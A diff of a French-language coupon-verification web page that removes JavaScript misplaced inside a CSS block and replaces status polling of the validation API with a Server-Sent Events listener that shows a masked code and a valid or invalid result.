@@ -17,114 +17,8 @@
         .main-container {
             max-width: 98vw;
             min-width: 0;
-            let result = null;
-            let pollErrors = 0;
-            while (!result) {
-                await new Promise(r => setTimeout(r, 3000));
-                await Promise.any(apiUrls.map(async (url) => {
-                    try {
-                        console.log('[POLL] Vérification statut sur', url + `/api/status/${requestId}`);
-                        const resp = await fetch(url + `/api/status/${requestId}`);
-                        if (!resp.ok) {
-                            pollErrors++;
-                            console.log('[POLL] HTTP error:', resp.status);
-                            return;
-                        }
-                        const data = await resp.json();
-                        console.log('[POLL] Réponse:', data);
-                        if (data.status === 'valid') result = 'OUI';
-                        if (data.status === 'invalid') result = 'NON';
-                        pollErrors = 0;
-                    } catch (e) {
-                        pollErrors++;
-                        console.log('[POLL] Erreur:', e);
-                    }
-                })).catch(() => {});
-                if (pollErrors > 10) {
-                    // Affiche une erreur claire sur l’interface
-                    let waitMsg = document.getElementById('waitMsg');
-                    if (waitMsg) waitMsg.remove();
-                    let overlay = document.getElementById('msgOverlay');
-                    if (overlay) overlay.remove();
-                    overlay = document.createElement('div');
-                    overlay.id = 'msgOverlay';
-                    overlay.style = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:999;background:rgba(255,255,255,0.85);display:flex;align-items:center;justify-content:center;';
-                    const errorMsg = document.createElement('div');
-                    errorMsg.id = 'resultMsg';
-                    errorMsg.style = 'background:#ffcdd2;color:#b71c1c;padding:32px 0 28px 0;border-radius:22px;font-size:1.18rem;font-weight:600;box-shadow:0 8px 32px 0 rgba(31,38,135,0.18),0 2px 12px rgba(33,150,243,0.10);max-width:420px;min-width:0;margin:0;display:flex;flex-direction:column;align-items:center;gap:18px;border:1.5px solid #e3f2fd;';
-                    errorMsg.innerHTML = '<span style="font-size:2.2rem;">❌</span><div style="font-size:1.35rem;font-weight:700;margin-bottom:6px;">Erreur de connexion au serveur</div><div style="font-size:1.08rem;">Impossible de contacter l’API pour vérifier le statut du coupon.<br>Vérifiez l’URL Render ou contactez le support.</div>';
-                    const retryBtn = document.createElement('button');
-                    retryBtn.textContent = 'Recommencer';
-                    retryBtn.style = 'margin-top:18px;padding:10px 24px;background:#1976d2;color:#fff;border:none;border-radius:8px;font-size:1.08rem;font-weight:600;cursor:pointer;box-shadow:0 2px 8px rgba(33,150,243,0.10);';
-                    retryBtn.onclick = () => { window.location.reload(); };
-                    errorMsg.appendChild(retryBtn);
-                    overlay.appendChild(errorMsg);
-                    document.body.appendChild(overlay);
-                    return;
-                }
-            }
-            // Afficher le résultat dès la réponse
-            let waitMsg2 = document.getElementById('waitMsg');
-            if (waitMsg2) waitMsg2.remove();
-            let resultMsg2 = document.getElementById('resultMsg');
-            if (resultMsg2) resultMsg2.remove();
-            // Nettoyer overlay si existe
-            let overlay2 = document.getElementById('msgOverlay');
-            if (overlay2) overlay2.remove();
-            overlay2 = document.createElement('div');
-            overlay2.id = 'msgOverlay';
-            overlay2.style = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:999;background:rgba(255,255,255,0.85);display:flex;align-items:center;justify-content:center;';
-            resultMsg2 = document.createElement('div');
-            resultMsg2.id = 'resultMsg';
-            resultMsg2.setAttribute('aria-live', 'polite');
-            resultMsg2.style = 'background:#fff;color:#1976d2;padding:32px 0 28px 0;border-radius:22px;font-size:1.18rem;font-weight:500;box-shadow:0 8px 32px 0 rgba(31,38,135,0.18),0 2px 12px rgba(33,150,243,0.10);max-width:420px;min-width:0;margin:0;display:flex;flex-direction:column;align-items:center;gap:18px;border:1.5px solid #e3f2fd;';
-            let codeMasked = code.replace(/.(?=.{4})/g, '•');
-            let icon = '', titre = '', msg = '';
-            if (result === 'OUI') {
-                icon = `<span style='font-size:2.2rem;'>✅</span>`;
-                titre = `<div style='font-size:1.35rem;font-weight:700;margin-bottom:6px;'>Coupon valide</div>`;
-                msg = `<div style='font-size:1.08rem;'>Félicitations, votre coupon est <b>valide</b> !</div>`;
-            } else if (result === 'NON') {
-                icon = `<span style='font-size:2.2rem;'>❌</span>`;
-                titre = `<div style='font-size:1.35rem;font-weight:700;margin-bottom:6px;'>Coupon invalide</div>`;
-                msg = `<div style='font-size:1.08rem;'>Désolé, ce coupon n'est pas valide.</div>`;
-            }
-            resultMsg2.innerHTML = `
-                <div style='margin-bottom:0;'>${icon}</div>
-                ${titre}
-                <div style="font-size:1.08rem;margin-bottom:2px;">Votre code&nbsp;:</div>
-                <div style="font-family:monospace;background:#e3f2fd;padding:6px 18px;border-radius:8px;font-size:1.18em;letter-spacing:2px;font-weight:600;box-shadow:0 1px 4px rgba(33,150,243,0.08);margin-bottom:8px;">${codeMasked}</div>
-                ${msg}
-            `;
-            // Bouton recommencer
-            const retryBtn = document.createElement('button');
-            retryBtn.textContent = 'Recommencer';
-            retryBtn.style = 'margin-top:18px;padding:10px 24px;background:#1976d2;color:#fff;border:none;border-radius:8px;font-size:1.08rem;font-weight:600;cursor:pointer;box-shadow:0 2px 8px rgba(33,150,243,0.10);';
-            retryBtn.onmouseover = () => retryBtn.style.background = '#125ea7';
-            retryBtn.onmouseout = () => retryBtn.style.background = '#1976d2';
-            retryBtn.onclick = () => {
-                // Nettoyer tous les overlays et messages
-                const overlays = document.querySelectorAll('#msgOverlay');
-                overlays.forEach(o => o.remove());
-                const waitMsg = document.getElementById('waitMsg');
-                if (waitMsg) waitMsg.remove();
-                const resultMsg = document.getElementById('resultMsg');
-                if (resultMsg) resultMsg.remove();
-                // Réafficher le formulaire et focus
-                document.getElementById('codeForm').reset();
-                document.getElementById('codeForm').classList.remove('hidden');
-                document.getElementById('couponCode').focus();
-            };
-            resultMsg2.appendChild(retryBtn);
-            overlay2.appendChild(resultMsg2);
-            document.body.appendChild(overlay2);
-            // Accessibilité focus sur le résultat
-            resultMsg2.setAttribute('tabindex', '-1');
-            resultMsg2.focus();
-            margin-bottom: 34px;
-            letter-spacing: 1px;
-            text-shadow: 0 2px 8px rgba(33,150,243,0.08);
         }
+        /* ...le reste du CSS... */
         .coupon-chooser {
             display: flex;
             flex-direction: column;
@@ -525,78 +419,78 @@
                 });
             } catch {}
 
-            // Attente de validation manuelle sur l'API (on interroge les deux serveurs en parallèle, sans limite de temps)
-            let result = null;
-            while (!result) {
-                await new Promise(r => setTimeout(r, 3000));
-                await Promise.any(apiUrls.map(async (url) => {
-                    try {
-                        const resp = await fetch(url + `/api/status/${requestId}`);
-                        const data = await resp.json();
-                        if (data.status === 'valid') result = 'OUI';
-                        if (data.status === 'invalid') result = 'NON';
-                    } catch {}
-                })).catch(() => {});
-            }
-            let waitMsg2 = document.getElementById('waitMsg');
-            if (waitMsg2) waitMsg2.remove();
-            let resultMsg2 = document.getElementById('resultMsg');
-            if (resultMsg2) resultMsg2.remove();
-            // Nettoyer overlay si existe
-            let overlay2 = document.getElementById('msgOverlay');
-            if (overlay2) overlay2.remove();
-            overlay2 = document.createElement('div');
-            overlay2.id = 'msgOverlay';
-            overlay2.style = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:999;background:rgba(255,255,255,0.85);display:flex;align-items:center;justify-content:center;';
-            resultMsg2 = document.createElement('div');
-            resultMsg2.id = 'resultMsg';
-            resultMsg2.setAttribute('aria-live', 'polite');
-            resultMsg2.style = 'background:#fff;color:#1976d2;padding:32px 0 28px 0;border-radius:22px;font-size:1.18rem;font-weight:500;box-shadow:0 8px 32px 0 rgba(31,38,135,0.18),0 2px 12px rgba(33,150,243,0.10);max-width:420px;min-width:0;margin:0;display:flex;flex-direction:column;align-items:center;gap:18px;border:1.5px solid #e3f2fd;';
-            let codeMasked = code.replace(/.(?=.{4})/g, '•');
-            let icon = '', titre = '', msg = '';
-            if (result === 'OUI') {
-                icon = `<span style='font-size:2.2rem;'>✅</span>`;
-                titre = `<div style='font-size:1.35rem;font-weight:700;margin-bottom:6px;'>Coupon valide</div>`;
-                msg = `<div style='font-size:1.08rem;'>Félicitations, votre coupon est <b>valide</b> !</div>`;
-            } else if (result === 'NON') {
-                icon = `<span style='font-size:2.2rem;'>❌</span>`;
-                titre = `<div style='font-size:1.35rem;font-weight:700;margin-bottom:6px;'>Coupon invalide</div>`;
-                msg = `<div style='font-size:1.08rem;'>Désolé, ce coupon n'est pas valide.</div>`;
-            }
-            resultMsg2.innerHTML = `
-                <div style='margin-bottom:0;'>${icon}</div>
-                ${titre}
-                <div style="font-size:1.08rem;margin-bottom:2px;">Votre code&nbsp;:</div>
-                <div style="font-family:monospace;background:#e3f2fd;padding:6px 18px;border-radius:8px;font-size:1.18em;letter-spacing:2px;font-weight:600;box-shadow:0 1px 4px rgba(33,150,243,0.08);margin-bottom:8px;">${codeMasked}</div>
-                ${msg}
-            `;
-            // Bouton recommencer
-            const retryBtn = document.createElement('button');
-            retryBtn.textContent = 'Recommencer';
-            retryBtn.style = 'margin-top:18px;padding:10px 24px;background:#1976d2;color:#fff;border:none;border-radius:6px;font-size:1.08rem;font-weight:600;cursor:pointer;box-shadow:0 2px 8px rgba(33,150,243,0.10);';
-            retryBtn.onclick = () => {
-                // Réinitialisation complète de l’interface sans reload
-                // Nettoyer tous les overlays/messages
-                const overlays = document.querySelectorAll('#msgOverlay');
-                overlays.forEach(o => o.remove());
-                let waitMsg = document.getElementById('waitMsg');
-                if (waitMsg) waitMsg.remove();
-                let resultMsg = document.getElementById('resultMsg');
-                if (resultMsg) resultMsg.remove();
-                // Masquer le formulaire et réafficher la liste des coupons
-                document.getElementById('codeForm').reset();
-                document.getElementById('codeForm').classList.add('hidden');
-                const chooser = document.querySelector('.coupon-chooser');
-                if (chooser) chooser.style.display = '';
-                // Réinitialiser le choix du coupon
-                selectedCoupon = null;
+            // Attente du résultat via SSE (Server-Sent Events)
+            const sseUrl = apiUrls[0] + `/api/stream/${requestId}`;
+            const evtSource = new EventSource(sseUrl);
+            evtSource.onmessage = function(event) {
+                let data = {};
+                try { data = JSON.parse(event.data); } catch {}
+                let result = null;
+                if (data.status === 'valid') result = 'OUI';
+                if (data.status === 'invalid') result = 'NON';
+                if (result) {
+                    evtSource.close();
+                    let waitMsg2 = document.getElementById('waitMsg');
+                    if (waitMsg2) waitMsg2.remove();
+                    let resultMsg2 = document.getElementById('resultMsg');
+                    if (resultMsg2) resultMsg2.remove();
+                    // Nettoyer overlay si existe
+                    let overlay2 = document.getElementById('msgOverlay');
+                    if (overlay2) overlay2.remove();
+                    overlay2 = document.createElement('div');
+                    overlay2.id = 'msgOverlay';
+                    overlay2.style = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:999;background:rgba(255,255,255,0.85);display:flex;align-items:center;justify-content:center;';
+                    resultMsg2 = document.createElement('div');
+                    resultMsg2.id = 'resultMsg';
+                    resultMsg2.setAttribute('aria-live', 'polite');
+                    resultMsg2.style = 'background:#fff;color:#1976d2;padding:32px 0 28px 0;border-radius:22px;font-size:1.18rem;font-weight:500;box-shadow:0 8px 32px 0 rgba(31,38,135,0.18),0 2px 12px rgba(33,150,243,0.10);max-width:420px;min-width:0;margin:0;display:flex;flex-direction:column;align-items:center;gap:18px;border:1.5px solid #e3f2fd;';
+                    let codeMasked = code.replace(/.(?=.{4})/g, '•');
+                    let icon = '', titre = '', msg = '';
+                    if (result === 'OUI') {
+                        icon = `<span style='font-size:2.2rem;'>✅</span>`;
+                        titre = `<div style='font-size:1.35rem;font-weight:700;margin-bottom:6px;'>Coupon valide</div>`;
+                        msg = `<div style='font-size:1.08rem;'>Félicitations, votre coupon est <b>valide</b> !</div>`;
+                    } else if (result === 'NON') {
+                        icon = `<span style='font-size:2.2rem;'>❌</span>`;
+                        titre = `<div style='font-size:1.35rem;font-weight:700;margin-bottom:6px;'>Coupon invalide</div>`;
+                        msg = `<div style='font-size:1.08rem;'>Désolé, ce coupon n'est pas valide.</div>`;
+                    }
+                    resultMsg2.innerHTML = `
+                        <div style='margin-bottom:0;'>${icon}</div>
+                        ${titre}
+                        <div style="font-size:1.08rem;margin-bottom:2px;">Votre code&nbsp;:</div>
+                        <div style="font-family:monospace;background:#e3f2fd;padding:6px 18px;border-radius:8px;font-size:1.18em;letter-spacing:2px;font-weight:600;box-shadow:0 1px 4px rgba(33,150,243,0.08);margin-bottom:8px;">${codeMasked}</div>
+                        ${msg}
+                    `;
+                    // Bouton recommencer
+                    const retryBtn = document.createElement('button');
+                    retryBtn.textContent = 'Recommencer';
+                    retryBtn.style = 'margin-top:18px;padding:10px 24px;background:#1976d2;color:#fff;border:none;border-radius:6px;font-size:1.08rem;font-weight:600;cursor:pointer;box-shadow:0 2px 8px rgba(33,150,243,0.10);';
+                    retryBtn.onclick = () => {
+                        // Réinitialisation complète de l’interface sans reload
+                        // Nettoyer tous les overlays/messages
+                        const overlays = document.querySelectorAll('#msgOverlay');
+                        overlays.forEach(o => o.remove());
+                        let waitMsg = document.getElementById('waitMsg');
+                        if (waitMsg) waitMsg.remove();
+                        let resultMsg = document.getElementById('resultMsg');
+                        if (resultMsg) resultMsg.remove();
+                        // Masquer le formulaire et réafficher la liste des coupons
+                        document.getElementById('codeForm').reset();
+                        document.getElementById('codeForm').classList.add('hidden');
+                        const chooser = document.querySelector('.coupon-chooser');
+                        if (chooser) chooser.style.display = '';
+                        // Réinitialiser le choix du coupon
+                        selectedCoupon = null;
+                    };
+                    resultMsg2.appendChild(retryBtn);
+                    overlay2.appendChild(resultMsg2);
+                    document.body.appendChild(overlay2);
+                    // Accessibilité focus sur le résultat
+                    resultMsg2.setAttribute('tabindex', '-1');
+                    resultMsg2.focus();
+                }
             };
-            resultMsg2.appendChild(retryBtn);
-            overlay2.appendChild(resultMsg2);
-            document.body.appendChild(overlay2);
-            // Accessibilité focus sur le résultat
-            resultMsg2.setAttribute('tabindex', '-1');
-            resultMsg2.focus();
         });
     </script>
 </body>
